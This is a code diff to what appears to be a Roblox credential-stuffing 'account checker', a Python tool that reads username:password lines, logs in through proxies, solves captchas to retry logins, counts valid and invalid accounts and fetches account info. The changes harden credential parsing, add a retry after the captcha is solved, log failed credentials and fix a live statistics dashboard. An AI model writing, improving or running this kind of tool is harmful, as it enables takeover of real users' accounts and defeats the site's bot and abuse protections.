@@ -61,12 +61,17 @@ def check_account_task(account_line, proxy_dict):
             update_stats("invalid")
             return
 
-        parts = account_line.strip().split(':')
+        parts = account_line.strip().split(':', 1)
+        if len(parts) != 2:
+            update_stats("invalid")
+            return
+            
         username = parts[0]
         password = parts[1]
         
         session = RobloxSession(proxy=proxy_dict)
         session.url = "https://www.roblox.com/login"
+        session.username = username  # Store for retry
         
         # 1. Login Attempt
         login_success = session.login(username, password)
@@ -79,6 +84,7 @@ def check_account_task(account_line, proxy_dict):
                 if solved:
                     update_stats("captcha_solved")
                     time.sleep(1)
+                    # Retry login with same credentials after captcha solved
                     login_success = session.login(username, password)
                 else:
                     update_stats("errors")
@@ -87,6 +93,7 @@ def check_account_task(account_line, proxy_dict):
             
             if not login_success:
                 update_stats("invalid")
+                add_log(f"❌ {username}: Invalid credentials", "red")
                 return
 
         # 2. Get Info
@@ -177,8 +184,13 @@ def main():
                         for entry in activity_log:
                             log_table.add_row(entry)
                     
+                    # Build the panel content properly
+                    panel_content = f"{stats_text}\n"
+                    for row in activity_log:
+                        panel_content += f"{row.plain if hasattr(row, 'plain') else str(row)}\n"
+                    
                     return Panel(
-                        f"{stats_text}\n\n" + "".join([log_table.__rich__() if hasattr(log_table, '__rich__') else str(log_table)]),
+                        panel_content,
                         title="📊 Statistics & Activity",
                         border_style="green"
                     )
